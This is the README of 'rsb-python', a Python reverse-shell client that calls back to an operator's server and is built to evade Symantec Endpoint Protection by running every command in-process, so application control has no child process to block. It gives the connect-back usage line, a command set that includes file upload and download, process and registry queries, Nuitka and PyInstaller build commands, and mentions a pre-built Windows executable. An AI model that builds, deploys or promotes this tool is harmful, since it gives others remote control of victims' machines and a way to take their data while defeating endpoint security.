# rsb-python

Standalone **Python** client for the rsb reverse-shell protocol v2.
Separate from the C implementation (which lives in the
ReverseShell-Bypass-Symantec repo) — same wire protocol, same evasion
philosophy, different binary signature.

**No command-execution primitive.** Every command runs in-process with
pure stdlib (ctypes/winreg). Nothing is ever spawned, so Symantec
Application Control has no child process to block — the same property
that let the original 2018 client bypass SEP 14.2.

## Files

- `rsb_client.py` — the client (stdlib only, no pip deps)
- `build/rsb_client_py.exe` — pre-built standalone Windows x64 exe
  (Nuitka onefile; runs on any Windows without Python installed)
- `test_client.py` — E2E protocol test (Linux, no deps)

## Usage

```
rsb_client_py.exe <server-ip> <port>
```

Pairs with the C server from the other repo (`rsb_server64.exe <port>`)
— protocol v2 is identical. Commands: `ls [path]`, `pwd`, `cd`, `get`,
`put`, `whoami`, `hostname`, `ipconfig`, `ps`, `sysinfo`, `regq`, `help`,
`exit`.

## Build

Cross-compile from Linux (already done — `build/rsb_client_py.exe`):

```
python3 -m venv .venv && .venv/bin/pip install nuitka
.venv/bin/python -m nuitka --onefile --mingw64 --assume-yes-for-downloads \
    --output-dir=build --output-filename=rsb_client_py.exe rsb_client.py
```

On Windows (also the only route to a **32-bit** exe — the cross-built
one is x64):

```
pip install pyinstaller
pyinstaller -F rsb_client.py
```

## Verification

- `test_client.py` passes E2E (framing, get/put byte-exact, error paths,
  exit handshake) against the real client.
- Windows-only commands (`ps`, `sysinfo`, `ipconfig`, `regq`) use ctypes
  and are exercised on a real Windows box via the selftest kit in the C
  repo.
